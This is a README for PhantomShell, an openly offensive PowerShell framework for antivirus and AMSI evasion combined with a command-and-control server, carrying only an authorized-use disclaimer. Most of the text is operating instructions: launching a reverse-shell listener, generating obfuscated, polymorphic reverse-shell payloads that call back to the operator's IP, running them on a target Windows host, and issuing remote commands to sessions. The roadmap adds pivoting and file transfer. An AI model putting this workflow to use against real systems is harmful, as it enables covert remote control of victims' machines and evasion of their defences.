<div align="center">

```
  ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
  ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
  ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
  ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
  ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
       ███████╗██╗  ██╗███████╗██╗     ██╗
       ██╔════╝██║  ██║██╔════╝██║     ██║
       ███████╗███████║█████╗  ██║     ██║
       ╚════██║██╔══██║██╔══╝  ██║     ██║
       ███████║██║  ██║███████╗███████╗███████╗
       ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```

# 👻 PhantomShell

### Advanced PowerShell AV / AMSI Evasion Framework + Enterprise C2 Server

Red-team framework designed for **authorized penetration testing and adversary simulation**.

PhantomShell combines an **advanced PowerShell payload generator** with a **lightweight Command & Control (C2) infrastructure**, enabling red team operators to deploy, manage, and interact with compromised hosts during controlled security assessments.

</div>

---

# 🚀 Features

## ⚡ Payload Generation

- Multi-layer PowerShell encoding
- AMSI-aware payload structures
- Polymorphic payload generation
- Randomized variable obfuscation
- Multiple delivery formats

## 🎮 Command & Control

- Lightweight Python C2 server
- Web interface for session management
- Interactive operator CLI
- Multiple concurrent session support
- Real-time command execution

## 🎯 Red Team Operations

- Reverse shell payload generation
- HTTP payload hosting
- Remote command execution
- Session monitoring

---

# 🏗 Architecture

```
Target Machine
      │
      │ Reverse Shell
      ▼
PhantomShell C2 Server
      │
      ├── CLI Interface
      │
      └── Web Management Dashboard
```

The payload executed on a target system connects back to the **PhantomShell listener**, allowing operators to control sessions through the CLI or web interface.

---

# 📦 Installation

## Requirements

- Python **3.8+**
- Linux or macOS host system
- Windows target machine

---

## Clone Repository

```bash
git clone https://github.com/adrilaw/PhantomShell.git
cd PhantomShell
```

---

# ⚡ Quick Start

## Start the C2 Server

```bash
python3 phantomc2.py --port 4444 --web-port 8080 --password StrongPassword
```

This launches:

- Reverse shell listener on **4444**
- Web dashboard on **8080**

---

## Generate Reverse Shell Payload

```bash
python3 phantomshell.py revshell -i YOUR_IP -p 4444
```

Copy the generated command and execute it on the **target Windows system**.

---

## Access Web Dashboard

```
http://YOUR_SERVER_IP:8080
```

Login using the password specified when starting the C2 server.

---

# 🧰 Command Reference

## Start C2 Server

```bash
python3 phantomc2.py c2
```

### Options

| Option | Description |
|------|-------------|
| `--host` | Bind address |
| `--port` | Reverse shell listener port |
| `--web-port` | Web UI port |
| `--password` | Web interface password |
| `--no-cli` | Disable CLI |

Example:

```bash
python3 phantomc2.py --port 4444 --web-port 8080 --password RedTeam2026
```

---

## Generate Payload

```bash
python3 phantomc2.py revshell -i <IP> -p <PORT>
```

### Optional Parameters

| Option | Description |
|------|-------------|
| `--obf-profile` | Obfuscation profile |
| `--layers` | Encoding layers |
| `--format` | Payload format |
| `--enc-b64` | Encode IP and port |

Example:

```bash
python3 phantomc2.py revshell -i 10.10.10.5 -p 4444 -o random -l 3
```

---

## HTTP Payload Hosting

```bash
python3 phantomc2.py server -i <IP> -p <PORT>
```

Example:

```bash
python3 phantomc2.py server -i 10.10.10.5 -p 4444 --server-port 8000
```

---

# 🖥 C2 Operations

Once a target connects, operators can manage sessions.

### List Sessions

```
sessions
```

### Interact With Session

```
interact <session_id>
```

### Execute Command

```
exec <session_id> <command>
```

Example

```
exec 1 whoami
```

### Kill Session

```
kill <session_id>
```

---

# 🔐 Payload Techniques

PhantomShell implements several techniques to reduce detection.

### Obfuscation

- Variable randomization
- Payload polymorphism
- Encoded execution layers

### Encoding Workflow

```
PowerShell Payload
      ↓
Unicode Encoding
      ↓
Base64 Encoding
      ↓
Execution Wrapper
```

---

# 🎯 Example Red Team Workflow

### 1. Start Infrastructure

```bash
python3 phantomc2.py c2 --port 4444 --web-port 8080
```

### 2. Generate Payload

```bash
python3 phantomc2.py revshell -i 192.168.1.100 -p 4444
```

### 3. Execute on Target

Run the generated command on the Windows system.

### 4. Manage Session

```
sessions
interact 1
whoami
hostname
```

---

# 🛡 Security Considerations

PhantomShell should only be used in **controlled and authorized environments**.

Recommended operational security practices:

- Use strong authentication passwords
- Restrict access with firewall rules
- Deploy behind reverse proxy with HTTPS
- Monitor infrastructure logs
- Rotate infrastructure after engagements

---

# 🐛 Troubleshooting

## Port Already In Use

Check which process is using the port:

```bash
netstat -tulpn | grep 4444
```

---

## Web Dashboard Not Accessible

Check if the service is listening:

```bash
netstat -tulpn | grep 8080
```

Verify firewall rules if necessary.

---

# 🛣 Roadmap

Future development plans include:

- Encrypted C2 communications
- Database-backed session persistence
- Multi-user role-based access control
- File upload and download capabilities
- SOCKS proxy pivoting
- Plugin architecture

---

# 🤝 Contributing

Contributions are welcome.

Possible contribution areas:

- Additional obfuscation techniques
- New payload delivery formats
- C2 server improvements
- Documentation
- Cross-platform testing

Workflow:

```
Fork repository
Create feature branch
Commit improvements
Submit pull request
```

---

# ⚠ Legal Disclaimer

This software is intended **exclusively for authorised cybersecurity testing**.

Allowed uses include:

- Authorized penetration testing
- Red team engagements
- Security research
- Capture-the-Flag environments

Unauthorized use against systems without explicit permission may violate computer crime laws.

The author assumes **no responsibility for misuse**.

---

# 📜 License

This project is licensed under:

**GNU General Public License**

See `LICENSE` for details.

---

# 🙏 Credits

PhantomShell builds on concepts from the offensive security community.

Inspirations include:

- Nishang PowerShell framework
- AMSI bypass research
- Red team tools such as Cobalt Strike and Metasploit

---

# 👨‍💻 Author

**Dodin Mel Adrien Lawrence Enzo**

Offensive Security | Red Teaming

🔗 LinkedIn  
https://www.linkedin.com/in/dodin-mel-adrien-lawrence-enzo-5568b91b5/

🐦 Twitter  
https://twitter.com/AdrienDodin

---

<div align="center">

⭐ If this project helped you during research or a security engagement, consider starring the repository.

</div>
